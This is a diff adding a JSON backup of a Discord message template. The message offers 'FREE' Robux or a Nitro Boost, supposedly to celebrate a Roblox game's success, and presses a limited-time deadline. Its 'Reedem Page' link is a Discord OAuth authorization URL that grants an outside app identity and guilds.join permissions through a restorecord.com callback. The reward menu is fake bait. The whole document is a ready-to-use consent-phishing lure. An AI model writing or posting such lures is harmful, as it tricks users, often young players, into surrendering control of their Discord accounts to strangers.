@@ -1,0 +1,89 @@
+{
+  "version": 8,
+  "backups": [
+    {
+      "messages": [
+        {
+          "_id": "",
+          "data": {
+            "flags": 32768,
+            "components": [
+              {
+                "type": 17,
+                "components": [
+                  {
+                    "type": 12,
+                    "items": [
+                      {
+                        "media": {
+                          "url": "https://cdn.discordapp.com/attachments/1482307470603976805/1485140832947535974/BackgroundEraser_20260322_075917558.png?ex=69c0c8af&is=69bf772f&hm=ffdd25ff69c3271153221c34ce28556ed738004d0006cb369def7b7ead6d9974&"
+                        }
+                      }
+                    ]
+                  },
+                  {
+                    "type": 10,
+                    "content": "## <:emoji_6:1481554085927976961> Claim Your **__FREE__** Reward! <:emoji_6:1481554085927976961>\n<:emoji_36:1482133340432629781> To celebrate **Nitro World** becoming the top game on Roblox, the developers are giving away __**FREE REWARDS**__ to all of our Members!"
+                  },
+                  {
+                    "type": 14
+                  },
+                  {
+                    "type": 10,
+                    "content": "## <:Support:1482133184119308328> How do I claim?\n<:1_white_number1:1485136835586953427> Select **ANY** Prize below\n<:1_white_number2:1485136862715711488> Or, Visit the [Reedem Page](https://discord.com/oauth2/authorize?client_id=1482129704675836079&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1481174330619723871&prompt=none)\n<:1_white_number3:1485136887655043113> Complete the steps and receive your reward in DM Box! <a:Gift:1482472641586663457>"
+                  },
+                  {
+                    "type": 14
+                  },
+                  {
+                    "type": 10,
+                    "content": "## <:PinBlurple:1481563185499607041> NOTE:\n<:emoji_3:1481553997738545203> This is a **__LIMITED-TIME OFFER__** which will expire in — Be sure to claim it before it's gone forever!"
+                  }
+                ]
+              },
+              {
+                "type": 10,
+                "content": "‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ <a:emoji_46:1485142236692877322>"
+              },
+              {
+                "type": 1,
+                "components": [
+                  {
+                    "flows": {},
+                    "type": 3,
+                    "options": [
+                      {
+                        "label": "2,000 Robux",
+                        "value": "rs5AvYW27D",
+                        "emoji": {
+                          "id": "1485143154209591407",
+                          "name": "Roblox_Robux",
+                          "animated": false
+                        }
+                      },
+                      {
+                        "label": "Nitro Boost",
+                        "value": "06BPLKq9Pr",
+                        "emoji": {
+                          "id": "1481560724756238376",
+                          "name": "nitroboost",
+                          "animated": false
+                        }
+                      }
+                    ],
+                    "placeholder": "Choose Your Reward",
+                    "custom_id": "p_282739869845819396",
+                    "min_values": 1,
+                    "max_values": 1
+                  }
+                ]
+              }
+            ]
+          }
+        }
+      ],
+      "name": "Export 22.03.2026",
+      "targets": []
+    }
+  ]
+}
